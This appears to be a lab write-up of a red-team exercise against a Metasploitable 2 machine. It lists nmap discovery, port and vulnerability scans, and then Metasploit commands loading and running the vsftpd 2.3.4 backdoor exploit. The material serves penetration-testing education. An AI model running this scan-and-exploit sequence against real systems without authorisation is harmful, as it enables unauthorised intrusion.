# Attack Phase (Red Team Activity)

This section describes the offensive security activities performed from the attacker machine (Kali Linux).

The goal of the attack phase is to discover the target system, identify open ports and services, and attempt exploitation.

Target Machine: Metasploitable 2

---

# 1 Host Discovery

Before scanning ports, the attacker first checks whether the target system is alive.

Command:

```
ping TARGET_IP
```

Purpose:

Confirms that the target system is reachable on the network.

---

# 2 Fast Host Discovery using Nmap

Instead of scanning ports immediately, the attacker first confirms that the host is up.

Command:

```
nmap -sn TARGET_IP
```

Purpose:

Performs a ping scan to check if the system is active without scanning ports.

---

# 3 Fast Port Scan (Open Ports Only)

Command:

```
nmap -sS --open -T4 TARGET_IP
```

Explanation:

-sS  
Performs a TCP SYN scan which is fast and commonly used in penetration testing.

--open  
Displays only open ports.

-T4  
Increases scanning speed.

Purpose:

Quickly identifies open ports without unnecessary output.

---

# 4 Service Enumeration

Command:

```
nmap -sS -sV --open -T4 TARGET_IP
```

Explanation:

-sV  
Detects service versions running on open ports.

Purpose:

Identifies the applications running on each port, which helps in finding vulnerabilities.

---

# 5 Detailed Vulnerability Scan

Command:

```
nmap --script vuln TARGET_IP
```

Purpose:

Runs vulnerability detection scripts to identify known security issues on the target system.

---

# 6 Starting Metasploit Framework

After identifying vulnerabilities, the attacker loads the exploitation framework.

Command:

```
msfconsole
```

Purpose:

Launches the Metasploit Framework used for exploiting vulnerabilities.

---

# 7 Searching for Exploits

Command:

```
search vsftpd
```

Purpose:

Finds exploits related to the vulnerable FTP service running on the target.

---

# 8 Selecting an Exploit

Command:

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

Purpose:

Loads the exploit module targeting the vulnerable FTP service.

---

# 9 Setting Target Information

Command:

```
set RHOST TARGET_IP
```

Purpose:

Specifies the IP address of the target system.

---

# 10 Running the Exploit

Command:

```
exploit
```

Purpose:

Attempts to exploit the vulnerability and gain access to the target machine.

---

# Attack Phase Summary

The attacker performed the following steps:

1 Host discovery  
2 Port scanning  
3 Service enumeration  
4 Vulnerability identification  
5 Exploitation using Metasploit

These activities simulate a real-world penetration testing workflow performed by security professionals.
